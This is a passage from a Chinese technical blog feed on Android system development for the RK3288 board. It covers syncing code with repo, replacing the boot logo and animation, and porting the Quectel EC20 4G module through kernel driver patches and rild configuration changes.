时，<code>repo</code> 会根据 <code>xml</code> 中<code>project</code>的 <code>path</code> 信息创建相应路径，并将代码解析到该路径。根据以上 <code>test.xml</code> 信息可知，同步后的代码结构如下：</p><pre><code>.repo sdk-files u-boot/uboot-files kernel/kernel-files frameworks/base/frameworks_base-files</code></pre><h2 id="repo-操作"><a href="#repo-操作" class="headerlink" title="repo 操作"></a>repo 操作</h2><p>在代码全部提交到gitlab后，其它人就可以通过 <code>repo</code> 去下载同步和管理代码了。</p><h3 id="repo-init"><a href="#repo-init" class="headerlink" title="repo init"></a>repo init</h3><pre><code class="bash">$ mkdir root$ cd root$ git clone https://gitlab.com/te3597/git-repo.git ..# download manifest$ ../git-repo/repo init -u https://gitlab.com/te3597/manifest.git  -b master -m test.xml --no-repo-verify</code></pre><h3 id="repo-sync"><a href="#repo-sync" class="headerlink" title="repo sync"></a>repo sync</h3><p><code>repo sync</code> 会根据 <code>test.xml</code> 挨个从远程仓库拉取仓库代码到本地。</p><pre><code class="bash"># repo sync$ .repo/repo/repo sync</code></pre><h3 id="repo-list"><a href="#repo-list" class="headerlink" title="repo list"></a>repo list</h3><pre><code class="bash"># repo list$ .repo/repo/repo list. : te3597/sdkframeworks/base : te3597/frameworks_basekernel : te3597/kernelu-boot : te3597/uboot</code></pre><h3 id="repo-forall"><a href="#repo-forall" class="headerlink" title="repo forall"></a>repo forall</h3><p><code>repo forall</code> 是针对所有仓库的遍历操作，后面添加 <code>-c &lt;cmds&gt;</code> 可以遍历所有仓库并执行相应指令。</p><p>比如想要切换所有仓库的分支。</p><pre><code class="bash">.repo/repo/repo forall -c git checkout -b master</code></pre><h3 id="repo-status"><a href="#repo-status" class="headerlink" title="repo status"></a>repo status</h3><p><code>repo status</code> 与 <code>git status</code> 类似，不过前者针对的是所有仓库，后者针对某一个仓库。</p><pre><code>.repo/repo/repo status</code></pre><p><code>repo</code> 的其它相关操作可以参考 <code>Google</code> 安卓源码管理文档 <a href="https://source.android.com/setup/develop/repo">repo 使用</a> .</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://source.android.com/setup/develop/repo">repo 使用</a></li><li><a href="https://www.itmangoto.cn/2018/05/08/git-repo-install/">下载安装和使用git-repo</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> repo </tag>
            
            <tag> gitlab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RK3288 Android 10 系统开发[2] - 更新开机logo与动画</title>
      <link href="2022/02/22/android-ani/"/>
      <url>2022/02/22/android-ani/</url>
      
        <content type="html"><![CDATA[<h2 id="替换开机logo"><a href="#替换开机logo" class="headerlink" title="替换开机logo"></a>替换开机logo</h2><p>在 <code>kernel</code> 目录，将 <code>logo.bmp</code>, 以及 <code>logo_kernel.bmp</code> 替换为所需logo即可。</p><ul><li>logo.bmp: uboot 阶段显示</li><li>logo_kernel.bmp: kernel 阶段显示</li></ul><h2 id="替换-Android-开机动画"><a href="#替换-Android-开机动画" class="headerlink" title="替换 Android 开机动画"></a>替换 Android 开机动画</h2><h3 id="替换-bootanimation-zip"><a href="#替换-bootanimation-zip" class="headerlink" title="替换 bootanimation.zip"></a>替换 bootanimation.zip</h3><p><code>rk3288</code> android10 的动画文件位于 <code>device/rockchip/common</code> 目录，将默认的<code>bootanimation.zip</code> 替换为所需动画。</p><pre><code class="bash">mv bootanimation.zip device/rockchip/common</code></pre><h3 id="更新-device-mk"><a href="#更新-device-mk" class="headerlink" title="更新 device.mk"></a>更新 device.mk</h3><p>在 <code>device.mk</code> 中搜索 <code>bootanimation</code>, 发现当前设备默认不会替换动画文件，所以需要手动添加以下行。</p><pre><code class="makefile">--- a/device.mk+++ b/device.mk    @@ -1056,6 +1059,8 @@ else ifeq ($(TARGET_BOARD_PLATFORM_PRODUCT),laptop) else # tablet   PRODUCT_PROPERTY_OVERRIDES += \         ro.target.product=tablet+  PRODUCT_COPY_FILES += \+       $(LOCAL_PATH)/bootanimation.zip:/system/media/bootanimation.zip    PRODUCT_PACKAGES += \         SoundRecorder</code></pre><h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>如何判断当前设备类型呢，也就是如何得知 <code>TARGET_BOARD_PLATFORM_PRODUCT</code> 呢? 可以通过以下方式。</p><pre><code class="bash">$ cd &lt;sdk-root&gt;$ source build/envsetup.sh$ lunch rk3288_Android10-userdebug$ get_build_var TARGET_BOARD_PLATFORM_PRODUCTtablet</code></pre><p>可知当前产品类型为 <code>tablet</code> ,然后根据这个去看 <code>device.mk</code>, 匹配相应配置即可。</p><blockquote><p>在RK3288 Android10 sdk 中，配置好环境变量并确定设备类型后，即可使用 <code>get_build_var</code> 获取各类全局配置了。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> android </tag>
            
            <tag> rk3288 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RK3288 Android 10 系统开发[1] - 支持 EC20 4G 模块</title>
      <link href="2022/02/21/android-4g/"/>
      <url>2022/02/21/android-4g/</url>
      
        <content type="html"><![CDATA[<p>根据业务需求，需要升级安卓系统，从 <code>Android6.0</code> 升级到 <code>Android10.0</code>, 本节介绍如何移植 <code>EC20 4G</code> 模块。</p><p>主要参考 <code>Quetecl</code> 提供的以下文档。</p><ul><li><code>Quectel_WCDMA&amp;LTE_Linux_USB_Driver_User_Guide_V1.8.pdf</code></li><li><code>Quectel_Android_RIL_Driver_User_Guide_V1.9.pdf</code></li></ul><h2 id="kernel"><a href="#kernel" class="headerlink" title="kernel"></a>kernel</h2><p>内核部分，需要修改两部分，<code>EC20</code>模块的使能和供电, 以及 <code>EC20</code> 联网所需的驱动移植。</p><h3 id="EC20-供电使能"><a href="#EC20-供电使能" class="headerlink" title="EC20 供电使能"></a>EC20 供电使能</h3><p>针对供电使能问题，<code>dts</code> 中需要添加 <code>EC20</code> 模块的供电接口信息， <code>init-gpios</code> 对应EC20 供电接口， <code>4g_rst_gpio</code> 对应重置接口，这个可以参考原理图获取。</p><pre><code class="c"> &amp;pinctrl &#123;+       //used for init some gpio+       // GPIO0_B5 : EC20 4G module Power EN   (1)+       // GPIO8_A0 : EEPROM Write protect              (0)+       // GPIO5_C3 : EC20 4G module RF Disable (1)+       init-gpios = &lt; &amp;gpio0 RK_PB5 GPIO_ACTIVE_LOW&gt;;+       4g_rst_gpio = &lt;&amp;gpio5 RK_PB4 GPIO_ACTIVE_HIGH&gt;;+        backlight &#123;                bl_en: bl-en &#123;                        rockchip,pins = &lt;7 2 RK_FUNC_GPIO &amp;pcfg_pull_none&gt;;</code></pre><p>除了 <code>dts</code> 的修改外，还需要修改 <code>pinctrl</code> 驱动程序。</p><pre><code class="c">--- a/drivers/pinctrl/pinctrl-rockchip.c+++ b/drivers/pinctrl/pinctrl-rockchip.c@@ -41,6 +41,7 @@ #include &lt;linux/mfd/syscon.h&gt; #include &lt;linux/rockchip/cpu.h&gt; #include &lt;dt-bindings/pinctrl/rockchip.h&gt;+#include &lt;linux/of_gpio.h&gt;  #include &quot;core.h&quot; #include &quot;pinconf.h&quot;@@ -433,6 +434,14 @@ struct rockchip_pmx_func &#123;        u8                      ngroups; &#125;; +/*+ * porting from android6.0 + */+struct gpio_init_config &#123;+       struct gpio *gpios;+       int nr_gpios;+&#125;;+ struct rockchip_pinctrl &#123;        struct regmap                   *regmap_base;        int                             reg_size;@@ -446,6 +455,8 @@ struct rockchip_pinctrl &#123;        unsigned int                    ngroups;        struct rockchip_pmx_func        *functions;        unsigned int                    nfunctions;+       /* porting from android6.0 */+       struct gpio_init_config         *config; &#125;;  static struct regmap_config rockchip_regmap_config = &#123;@@ -4331,6 +4342,45 @@ static int rk3308b_soc_data_init(struct rockchip_pinctrl *info)        return 0; &#125; +/*+ * porting from android6.0+ */+static struct gpio_init_config *+of_get_gpio_init_config(struct device *dev, struct device_node *np)+&#123;+       struct gpio_init_config *config;+       int gpio, i;+       enum of_gpio_flags flags;++       config = devm_kzalloc(dev,+                       sizeof(struct gpio_init_config),+                       GFP_KERNEL);+       if (!config)+               return ERR_PTR(-ENOMEM);++       /* Fetch GPIOs. */+       config-&gt;nr_gpios = of_gpio_named_count(np, &quot;init-gpios&quot;);++       config-&gt;gpios = devm_kzalloc(dev,+                               sizeof(struct gpio) * config-&gt;nr_gpios,+                               GFP_KERNEL);+       if (!config-&gt;gpios)+               return ERR_PTR(-ENOMEM);++       for (i = 0; i &lt; config-&gt;nr_gpios; i++) &#123;+               //gpio = of_get_named_gpio(np, &quot;gpios&quot;, i);+               gpio = of_get_named_gpio_flags(np, &quot;init-gpios&quot;, i, &amp;flags);+               if (gpio &lt; 0)+                       break;+               config-&gt;gpios[i].gpio = gpio;+               config-&gt;gpios[i].flags = flags &amp; OF_GPIO_ACTIVE_LOW;++               printk(&quot;%s:gpio[%d] = %d, value = %lu\n&quot;,__func__, i, gpio, config-&gt;gpios[i].flags);+       &#125;++       return config;+&#125;+ static int rockchip_pinctrl_probe(struct platform_device *pdev) &#123;        struct rockchip_pinctrl *info;@@ -4339,7 +4389,9 @@ static int rockchip_pinctrl_probe(struct platform_device *pdev)        struct device_node *np = pdev-&gt;dev.of_node, *node;        struct resource *res;        void __iomem *base;-       int ret;+       int ret, i, gpio;+       enum of_gpio_flags flags;+       int gpio_active = 0;         if (!dev-&gt;of_node) &#123;                dev_err(dev, &quot;device tree node not found\n&quot;);@@ -4419,6 +4471,41 @@ static int rockchip_pinctrl_probe(struct platform_device *pdev)                return ret;        &#125; +       /* porting from android6.0 */+       np = dev-&gt;of_node;+       if (of_find_property(np, &quot;init-gpios&quot;, NULL)) &#123;+               info-&gt;config = of_get_gpio_init_config(&amp;pdev-&gt;dev, np);+               if (IS_ERR(info-&gt;config))+               return PTR_ERR(info-&gt;config);++               ret = gpio_request_array(info-&gt;config-&gt;gpios, info-&gt;config-&gt;nr_gpios);+               if (ret) &#123;+                       dev_err(&amp;pdev-&gt;dev, &quot;Could not obtain init GPIOs: %d\n&quot;, ret);+                       return ret;+               &#125;++               for(i = 0; i &lt; info-&gt;config-&gt;nr_gpios; i++) &#123;+                       gpio_direction_output(info-&gt;config-&gt;gpios[i].gpio, info-&gt;config-&gt;gpios[i].flags);+               &#125;+       &#125;+       // Reset 4G module+       gpio = of_get_named_gpio_flags(np, &quot;4g_rst_gpio&quot;, 0, &amp;flags);+       if (!gpio_is_valid(gpio)) &#123;+               dev_err(&amp;pdev-&gt;dev, &quot;invalid 4g rst gpio%d\n&quot;, gpio);+       &#125; else &#123;+               ret = devm_gpio_request(&amp;pdev-&gt;dev, gpio, &quot;4g_rst_gpio&quot;);+               if (ret) &#123;+                       dev_err(&amp;pdev-&gt;dev, &quot;failed to request GPIO%d for 4g_rst\n&quot;, gpio);+                       return ret;+               &#125;+               gpio_active = !(flags &amp; OF_GPIO_ACTIVE_LOW);+               gpio_direction_output(gpio, gpio_active);+               mdelay(350);+               gpio_direction_output(gpio, !gpio_active);+               printk(&quot;\n\n!!!!!!!!!!!4G reset!!!!!!!!!!!!!!!!!!!active=%d\n\n&quot;, gpio_active);+       &#125;+       /* porting end */+        platform_set_drvdata(pdev, info);         return 0;</code></pre><p>以上修改主要是为了使能 <code>EC20</code>模块，同时在开机过程中重置 <code>4G</code> 模块，以保证 <code>4G</code> 模块正常供电。</p><h3 id="EC20-驱动移植"><a href="#EC20-驱动移植" class="headerlink" title="EC20 驱动移植"></a>EC20 驱动移植</h3><p><code>EC20</code> 驱动相关文件如下：</p><pre><code>drivers/net/usb/qmi_wwan.cdrivers/usb/serial/option.cdrivers/usb/serial/qcserial.cdrivers/usb/serial/usb_wwan.c</code></pre><p><code>EC20</code> 包含以下4种工作模式：</p><ol><li> <code>USB Serial</code></li><li><code>GobiNet</code></li><li><code>QMI WWAN</code></li><li><code>CDC ACM</code></li></ol><p>我们使用的是第一种， <code>USB Serial</code>. 根据参考文档一一修改。</p><h4 id="添加-pid-vid"><a href="#添加-pid-vid" class="headerlink" title="添加 pid vid"></a>添加 <code>pid</code> <code>vid</code></h4><p>首先添加 <code>EC20</code> 模块的 <code>pid</code>, <code>vid</code>, 否则驱动无法识别设备。</p><ul><li><code>drivers/usb/serial/option.c</code></li></ul><pre><code class="c">@@ -573,6 +573,18 @@ static void option_instat_callback(struct urb *urb);   static const struct usb_device_id option_ids[] = &#123;+#if 1 // Added by Quectel+       &#123; USB_DEVICE(0x05C6, 0x9090)  &#125;, /* Quectel UC15 */+       &#123; USB_DEVICE(0x05C6, 0x9003)  &#125;, /* Quectel UC20 */+       &#123; USB_DEVICE(0x2C7C, 0x0125)  &#125;, /* Quectel EC25 */+       &#123; USB_DEVICE(0x2C7C, 0x0121)  &#125;, /* Quectel EC21 */+       &#123; USB_DEVICE(0x05C6, 0x9215)  &#125;, /* Quectel EC20 */+       &#123; USB_DEVICE(0x2C7C, 0x0191)  &#125;, /* Quectel EG91 */+       &#123; USB_DEVICE(0x2C7C, 0x0195)  &#125;, /* Quectel EG95 */+       &#123; USB_DEVICE(0x2C7C, 0x0306)  &#125;, /* Quectel EG06/EP06/EM06 */+       &#123; USB_DEVICE(0x2C7C, 0x0296)  &#125;, /* Quectel BG96 */+       &#123; USB_DEVICE(0x2C7C, 0x0435)  &#125;, /* Quectel AG35 */+#endif        &#123; USB_DEVICE(0x1286, 0x4e3c) &#125;,        &#123; USB_DEVICE(OPTION_VENDOR_ID, OPTION_PRODUCT_COLT) &#125;,        &#123; USB_DEVICE(OPTION_VENDOR_ID, OPTION_PRODUCT_RICOLA) &#125;,</code></pre><p>此外，为了防止与其它设备的id冲突，需要修改以下文件，禁用部分干扰项。</p><ul><li><code>drivers/net/usb/qmi_wwan.c</code></li></ul><pre><code class="c">--- a/drivers/net/usb/qmi_wwan.c+++ b/drivers/net/usb/qmi_wwan.c@@ -1332,7 +1332,8 @@ static const struct usb_device_id products[] = &#123;        &#123;QMI_GOBI_DEVICE(0x05c6, 0x9225)&#125;,      /* Sony Gobi 2000 Modem device (N0279, VU730) */        &#123;QMI_GOBI_DEVICE(0x05c6, 0x9245)&#125;,      /* Samsung Gobi 2000 Modem device (VL176) */        &#123;QMI_GOBI_DEVICE(0x03f0, 0x251d)&#125;,      /* HP Gobi 2000 Modem device (VP412) */-       &#123;QMI_GOBI_DEVICE(0x05c6, 0x9215)&#125;,      /* Acer Gobi 2000 Modem device (VP413) */+       // Disabled for prevent conflict from quectel EC20 driver+       //&#123;QMI_GOBI_DEVICE(0x05c6, 0x9215)&#125;,    /* Acer Gobi 2000 Modem device (VP413) */        &#123;QMI_FIXED_INTF(0x05c6, 0x9215, 4)&#125;,    /* Quectel EC20 Mini PCIe */        &#123;QMI_GOBI_DEVICE(0x05c6, 0x9265)&#125;,      /* Asus Gobi 2000 Modem device (VR305) */        &#123;QMI_GOBI_DEVICE(0x05c6, 0x9235)&#125;,      /* Top Global Gobi 2000 Modem device (VR306) */</code></pre><ul><li><code>drivers/usb/serial/qcserial.c</code></li></ul><pre><code class="c">--- a/drivers/usb/serial/qcserial.c+++ b/drivers/usb/serial/qcserial.c@@ -88,7 +88,8 @@ static const struct usb_device_id id_table[] = &#123;        &#123;USB_DEVICE(0x03f0, 0x241d)&#125;,   /* HP Gobi 2000 QDL device (VP412) */        &#123;USB_DEVICE(0x03f0, 0x251d)&#125;,   /* HP Gobi 2000 Modem device (VP412) */        &#123;USB_DEVICE(0x05c6, 0x9214)&#125;,   /* Acer Gobi 2000 QDL device (VP413) */-       &#123;USB_DEVICE(0x05c6, 0x9215)&#125;,   /* Acer Gobi 2000 Modem device (VP413) */+       // Disabled for prevent conflict from quectel EC20 driver+       //&#123;USB_DEVICE(0x05c6, 0x9215)&#125;, /* Acer Gobi 2000 Modem device (VP413) */        &#123;USB_DEVICE(0x05c6, 0x9264)&#125;,   /* Asus Gobi 2000 QDL device (VR305) */        &#123;USB_DEVICE(0x05c6, 0x9265)&#125;,   /* Asus Gobi 2000 Modem device (VR305) */        &#123;USB_DEVICE(0x05c6, 0x9234)&#125;,   /* Top Global Gobi 2000 QDL device (VR306) */</code></pre><h4 id="启用-reset-resume"><a href="#启用-reset-resume" class="headerlink" title="启用 reset_resume"></a>启用 <code>reset_resume</code></h4><p>启用 <code>reset_resume</code> 是为了防止系统进入挂起或睡眠模式后无法重新唤醒USB设备。</p><ul><li><code>drivers/usb/serial/option.c</code></li></ul><pre><code class="c">@@ -2051,6 +2063,9 @@ static struct usb_serial_driver option_1port_device = &#123; #ifdef CONFIG_PM        .suspend           = usb_wwan_suspend,        .resume            = usb_wwan_resume,+#if 1 // Added by Quectel+       .reset_resume      = usb_wwan_resume,+#endif #endif &#125;; </code></pre><h4 id="启用-autosuspend-remote-wakeup"><a href="#启用-autosuspend-remote-wakeup" class="headerlink" title="启用 autosuspend remote wakeup"></a>启用 <code>autosuspend</code> <code>remote wakeup</code></h4><p>为了支持USB网络的自动挂起与远程唤醒，可以添加以下patch，当然这不是必须的。</p><pre><code class="c">@@ -2086,6 +2101,33 @@ static int option_probe(struct usb_serial *serial,        if (device_flags &amp; NUMEP2 &amp;&amp; iface_desc-&gt;bNumEndpoints != 2)                return -ENODEV; +#if 1 // Added by Quectel+       //For USB Auto Suspend and Remote Wakeup+       if (serial-&gt;dev-&gt;descriptor.idVendor == cpu_to_le16(0x05C6) &amp;&amp; +               serial-&gt;dev-&gt;descriptor.idProduct == cpu_to_le16(0x9090)) &#123;+               pm_runtime_set_autosuspend_delay(&amp;serial-&gt;dev-&gt;dev, 3000);+               usb_enable_autosuspend(serial-&gt;dev);+               device_init_wakeup(&amp;serial-&gt;dev-&gt;dev, 1); //usb remote wakeup+       &#125;+       if (serial-&gt;dev-&gt;descriptor.idVendor == cpu_to_le16(0x05C6) &amp;&amp;+               serial-&gt;dev-&gt;descriptor.idProduct == cpu_to_le16(0x9003)) &#123;+               pm_runtime_set_autosuspend_delay(&amp;serial-&gt;dev-&gt;dev, 3000);+               usb_enable_autosuspend(serial-&gt;dev);+               device_init_wakeup(&amp;serial-&gt;dev-&gt;dev, 1); //usb remote wakeup+       &#125;+       if (serial-&gt;dev-&gt;descriptor.idVendor == cpu_to_le16(0x05C6) &amp;&amp;+               serial-&gt;dev-&gt;descriptor.idProduct == cpu_to_le16(0x9215)) &#123;+               pm_runtime_set_autosuspend_delay(&amp;serial-&gt;dev-&gt;dev, 3000);+               usb_enable_autosuspend(serial-&gt;dev);+               device_init_wakeup(&amp;serial-&gt;dev-&gt;dev, 1); //usb remote wakeup+       &#125;+       if (serial-&gt;dev-&gt;descriptor.idVendor == cpu_to_le16(0x2C7C)) &#123;+               pm_runtime_set_autosuspend_delay(&amp;serial-&gt;dev-&gt;dev, 3000);+               usb_enable_autosuspend(serial-&gt;dev);+               device_init_wakeup(&amp;serial-&gt;dev-&gt;dev, 1); //usb remote wakeup+       &#125;+#endif+</code></pre><h4 id="添加零包机制"><a href="#添加零包机制" class="headerlink" title="添加零包机制"></a>添加零包机制</h4><ul><li><code>drivers/usb/serial/usb_wwan.c</code></li></ul><pre><code class="c">--- a/drivers/usb/serial/usb_wwan.c+++ b/drivers/usb/serial/usb_wwan.c@@ -509,6 +509,17 @@ static struct urb *usb_wwan_setup_urb(struct usb_serial_port *port,                if ((desc-&gt;idVendor == cpu_to_le16(0x1286) &amp;&amp;                     desc-&gt;idProduct == cpu_to_le16(0x4e3c)))                        urb-&gt;transfer_flags |= URB_ZERO_PACKET;+#if 1+               // Added by Quectel for zero packet+               if (desc-&gt;idVendor == cpu_to_le16(0x05C6) &amp;&amp; desc-&gt;idProduct == cpu_to_le16(0x9090))+                       urb-&gt;transfer_flags |= URB_ZERO_PACKET;+               if (desc-&gt;idVendor == cpu_to_le16(0x05C6) &amp;&amp; desc-&gt;idProduct == cpu_to_le16(0x9003))+                       urb-&gt;transfer_flags |= URB_ZERO_PACKET;+               if (desc-&gt;idVendor == cpu_to_le16(0x05C6) &amp;&amp; desc-&gt;idProduct == cpu_to_le16(0x9215))+                       urb-&gt;transfer_flags |= URB_ZERO_PACKET;+               if (desc-&gt;idVendor == cpu_to_le16(0x2C7C))+                       urb-&gt;transfer_flags |= URB_ZERO_PACKET;+#endif        &#125;        return urb; &#125;</code></pre><h4 id="支持usb网络"><a href="#支持usb网络" class="headerlink" title="支持usb网络"></a>支持usb网络</h4><p>这一项主要是针对 EC20 的第5个usb interface，EC20 默认会生成 <code>ttyUSB0~ttyUSB3</code> 4个接口，还有一个 interface，可以用于支持 <code>Gobinet</code> 或者 <code>qmi wwan</code> 接口，用以生成 <code>ethx</code> 或者 <code>wwanx</code> 接口。以下patch就是为了防止 <code>USB serial</code> 驱动将该接口用掉。</p><pre><code class="c">--- a/drivers/usb/serial/option.c+++ b/drivers/usb/serial/option.c@@ -2082,6 +2082,29 @@ static int option_probe(struct usb_serial *serial,                                &amp;serial-&gt;interface-&gt;cur_altsetting-&gt;desc;        unsigned long device_flags = id-&gt;driver_info; +       #if 1 //Added by Quectel+       //Quectel UC20&#39;s interface 4 can be used as USB Network device+       if (serial-&gt;dev-&gt;descriptor.idVendor == cpu_to_le16(0x05C6) &amp;&amp;+               serial-&gt;dev-&gt;descriptor.idProduct == cpu_to_le16(0x9003) &amp;&amp;+               serial-&gt;interface-&gt;cur_altsetting-&gt;desc.bInterfaceNumber &gt;= 4)+               return -ENODEV;+       //Quectel EC20&#39;s interface 4 can be used as USB Network device+       if (serial-&gt;dev-&gt;descriptor.idVendor == cpu_to_le16(0x05C6) &amp;&amp;+               serial-&gt;dev-&gt;descriptor.idProduct == cpu_to_le16(0x9215) &amp;&amp;+               serial-&gt;interface-&gt;cur_altsetting-&gt;desc.bInterfaceNumber &gt;= 4)+               return -ENODEV;+       if (serial-&gt;dev-&gt;descriptor.idVendor == cpu_to_le16(0x2C7C)) &#123;+               __u16 idProduct = le16_to_cpu(serial-&gt;dev-&gt;descriptor.idProduct);+               //Quectel EC200&amp;UC200&#39;s interface 0 can be used as USB Network device (ecm, rndis)+               if (serial-&gt;interface-&gt;cur_altsetting-&gt;desc.bInterfaceClass != 0xFF)+                       return -ENODEV;+               //Quectel EC25&amp;EC21&amp;EG91&amp;EG95&amp;EG06&amp;EP06&amp;EM06&amp;BG96&amp;AG35&amp;EG12&amp;EG18&#39;s interface 4 can be used as USB network device (qmi,ecm,mbim)+               if ((idProduct != 0x6026 &amp;&amp; idProduct != 0x6126) &amp;&amp;+                       serial-&gt;interface-&gt;cur_altsetting-&gt;desc.bInterfaceNumber &gt;= 4)+                       return -ENODEV;+       &#125;+       #endif+        /* Never bind to the CD-Rom emulation interface */        if (iface_desc-&gt;bInterfaceClass == USB_CLASS_MASS_STORAGE)                return -ENODEV;</code></pre><blockquote><p>注意：该patch针对使用 <code>USB Serial</code> 模式的情况而言并不是必须的，加不加都无所谓。</p></blockquote><h3 id="kernel-config"><a href="#kernel-config" class="headerlink" title="kernel config"></a>kernel config</h3><p>当驱动和供电都没问题后，还需要确保以下功能配置，大部分已经默认支持了</p><ul><li>启用 ppp 相关配置</li><li>启用 USB serial 相关配置</li></ul><p>需要注意的是，由于 <code>android10</code> kernel版本 （<code>v4.19.194</code>） 比较新，所以 <code>qmi wwan</code> 驱动已经集成了 <code>EC20</code> 的 pid，vid，所以系统检测到设备会自动加载 <code>qmi_wwan</code> 驱动并自动生成 <code>wwan0</code> 接口，导致无法使用 <code>ppp</code> 拨号上网，为了解决这个问题，需要将 <code>qmi_wwan</code> 驱动禁用。</p><pre><code class="c">--- a/arch/arm/configs/rockchip_defconfig+++ b/arch/arm/configs/rockchip_defconfig@@ -327,7 +327,7 @@ CONFIG_USB_EPSON2888=y CONFIG_USB_KC2190=y CONFIG_USB_NET_CX82310_ETH=y CONFIG_USB_NET_KALMIA=y-CONFIG_USB_NET_QMI_WWAN=y+# CONFIG_USB_NET_QMI_WWAN is not set CONFIG_USB_HSO=y CONFIG_USB_NET_INT51X1=y CONFIG_USB_IPHETH=y</code></pre><p>至此，<code>kernel</code> 部分的修改就完成了。</p><h2 id="android"><a href="#android" class="headerlink" title="android"></a>android</h2><p>下面来看看 <code>android 10</code> 除  <code>kernel</code> 外的其它修改。</p><pre><code class="bash">device/rockchip/rk3288/rk3288_Android10/BoardConfig.mkdevice/rockchip/rk3288/rk3288_Android10/EC20/device/rockchip/rk3288/rk3288_Android10/rk3288_Android10.mkdevice/rockchip/rk3288/device.mkdevice/rockchip/rk3288/manifest_ab.xmldevice/rockchip/common/device.mkdevice/rockchip/common/init.rk30board.rchardware/ril/reference-ril/Android.mkhardware/ril/rild/rild.rcexternal/ppp/chat/Android.mk</code></pre><h3 id="vendor"><a href="#vendor" class="headerlink" title="vendor"></a>vendor</h3><ul><li><code>vendor/rockchip/common/phone/phone.mk</code></li></ul><p>这个目录的文件可改可不改，里面主要定义了 <code>dongle</code> 相关的配置，如果有用到就改。</p><h3 id="device"><a href="#device" class="headerlink" title="device"></a>device</h3><h4 id="BoardConfig-mk"><a href="#BoardConfig-mk" class="headerlink" title="BoardConfig.mk"></a>BoardConfig.mk</h4><ul><li><strong><code>device/rockchip/rk3288/rk3288_Android10/BoardConfig.mk</code></strong></li></ul><p>在 <code>BoardConfig.mk</code> 中添加 <code>BOARD_HAS_RK_4G_MODEM</code> 配置。</p><pre><code class="bash">--- a/rk3288_Android10/BoardConfig.mk+++ b/rk3288_Android10/BoardConfig.mk@@ -7,6 +7,9 @@ BOARD_GYROSCOPE_SENSOR_SUPPORT := true BUILD_WITH_GOOGLE_GMS_EXPRESS := false CAMERA_SUPPORT_AUTOFOCUS:= false +# enable 4g for ec20+BOARD_HAS_RK_4G_MODEM := true+ PRODUCT_KERNEL_CONFIG := rockchip_defconfig android-10.config  # AB image definition</code></pre><p>与 <code>BOARD_HAS_RK_4G_MODEM</code> 相关的配置主要有两处。分别配置了需要安装的软件和依赖的 <code>manifest.xml</code>.</p><pre><code class="bash"># device/rockchip/common/device.mkifeq ($(strip $(BOARD_HAS_RK_4G_MODEM)),true)PRODUCT_PACKAGES += \    CarrierDefaultApp \    CarrierConfig \    rild \    librk-ril \    dhcpcd  # device/rockchip/common/BoardConfig.mkifeq ($(strip $(BOARD_HAS_RK_4G_MODEM)),true)DEVICE_MANIFEST_FILE := device/rockchip/common/4g_modem/manifest.xmlendif</code></pre><p>这个 <code>manifest.xml</code>  和后面提到的 <code>manifest_ab.xml</code> 内容差不多，如果使用 <code>4g_modem</code> 目录下，那么下面关于 <code>manifest_ab.xml</code> 的修改就不用管了。</p><h4 id="rk3288-device-mk"><a href="#rk3288-device-mk" class="headerlink" title="rk3288/device.mk"></a>rk3288/device.mk</h4><ul><li><strong><code>device/rockchip/rk3288/device.mk</code></strong></li></ul><p>在 <code>device.mk</code> 中更新 <code>rild</code> 参数。</p><pre><code class="bash">--- a/device.mk+++ b/device.mk@@ -128,8 +128,8 @@ PRODUCT_PROPERTY_OVERRIDES += \                 ro.ril.ecclist=112,911 \                 ro.opengles.version=196610 \                 wifi.interface=wlan0 \-                rild.libpath=/system/lib/libril-rk29-dataonly.so \-                rild.libargs=-d /dev/ttyACM0 \+                rild.libpath=/vendor/lib/libreference-ril.so \+                rild.libargs=-d /dev/ttyUSB2 \                 persist.tegra.nvmmlite = 1 \                 ro.audio.monitorOrientation=true \                 debug.nfc.fw_download=false \</code></pre><h4 id="common-device-mk"><a href="#common-device-mk" class="headerlink" title="common/device.mk"></a>common/device.mk</h4><ul><li><strong><code>device/rockchip/common/device.mk</code></strong></li></ul><p>修改 <code>BOARD_HAS_RK_4G_MODEM</code> 相关的配置，禁用默认的 <code>librk-ril</code>, 并修正 <code>rild</code> 相关参数。</p><pre><code class="c">--- a/device.mk+++ b/device.mk@@ -202,7 +202,6 @@ PRODUCT_PACKAGES += \     CarrierDefaultApp \     CarrierConfig \     rild \-    librk-ril \     dhcpcd PRODUCT_PROPERTY_OVERRIDES += \@@ -218,11 +217,12 @@ PRODUCT_COPY_FILES += \                $(LOCAL_PATH)/4g_modem/lib64/librk-ril.so:$(TARGET_COPY_OUT_VENDOR)/lib64/librk-ril.so else PRODUCT_PROPERTY_OVERRIDES += \-               vendor.rild.libpath=/vendor/lib/librk-ril.so+               vendor.rild.libpath=/vendor/lib/libreference-ril.so \+               vendor.rild.libargs=-d /dev/ttyUSB2 PRODUCT_COPY_FILES += \-               $(LOCAL_PATH)/4g_modem/bin32/dhcpcd:$(TARGET_COPY_OUT_VENDOR)/bin/dhcpcd \-               $(LOCAL_PATH)/4g_modem/lib32/librk-ril.so:$(TARGET_COPY_OUT_VENDOR)/lib/librk-ril.so+               $(LOCAL_PATH)/4g_modem/bin32/dhcpcd:$(TARGET_COPY_OUT_VENDOR)/bin/dhcpcd+               #$(LOCAL_PATH)/4g_modem/lib32/librk-ril.so:$(TARGET_COPY_OUT_VENDOR)/lib/librk-ril.so endif endif</code></pre><blockquote><p>注意：为什么前面定义了 <code>rild.libpath</code>, <code>rild.libargs</code>, 这里还要定义 <code>vendor.rild.libpath</code>, <code>vendor.rild.libargs</code>, 这是因为 <code>rild</code> 有两套配置，根据配置 <code>PRODUCT_COMPATIBLE_PROPERTY</code> 使用这两套配置之一。</p></blockquote><h4 id="init-rk30board-rc"><a href="#init-rk30board-rc" class="headerlink" title="init.rk30board.rc"></a>init.rk30board.rc</h4><ul><li><strong><code>device/rockchip/common/init.rk30board.rc</code></strong></li></ul><p>在 <code>init.rk30board.rc</code> 文件中启动 <code>ril-daemon</code>, 而 <code>ril-daemon</code> 定义位于后续提及的 <code>rild.rc</code>.</p><pre><code class="c">--- a/init.rk30board.rc+++ b/init.rk30board.rc@@ -259,9 +259,9 @@ on 